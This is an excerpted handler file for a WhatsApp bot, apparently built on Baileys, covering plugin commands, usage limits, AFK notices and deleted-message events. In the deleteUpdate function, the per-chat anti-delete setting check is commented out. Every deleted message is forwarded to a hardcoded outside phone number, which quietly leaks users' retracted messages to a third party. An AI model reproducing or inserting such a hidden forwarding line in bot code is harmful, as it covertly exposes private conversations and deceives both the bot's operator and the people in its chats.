    ...
    try {
        ...
        try {
            ...
            if (user) {
                ...
                if (!('react' in user)) user.react = false;
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('banned' in user)) user.banned = false
                if (!user.react) user.react = false;
        ...
        if (m.isBaileys && m.fromMe)
            return
        // if (m.chat !== '120363183335590406@g.us') return console.log('returned');
        ...
        for (let name in global.plugins) {
            ...
            if ((usedPrefix = (match[0] || '')[0])) {
                ...
                if (!isPrems && plugin.limit && global.db.data.users[m.sender].limit < plugin.limit * 1) {
                    this.reply(m.chat, `Your limit runs out`, m)
                ...
                try {
                    ...
                    if (m.limit) m.reply(+m.limit + 'Limit')
                }
                break
            }
        }
...
export async function deleteUpdate(message) {
    try {
       ...
       // if (!chat.antiDelete) return
        this.copyNForward('94702978512@s.whatsapp.net', msg).catch(e => console.log(e, msg))
    } catch (e) {
        console.error(e)
    }
}
...
export async function presenceUpdate(presenceUpdate) {
    ...
    if (user?.afk && status === "composing" && user.afk > -1) {
        ...
        const caption = `\n@${username} stop afk, he's typing\n\nReason: ${user.afkReason ? user.afkReason : "No Reason"
            }\nDuring ${timeAfk.toTimeString()} ago\n`;
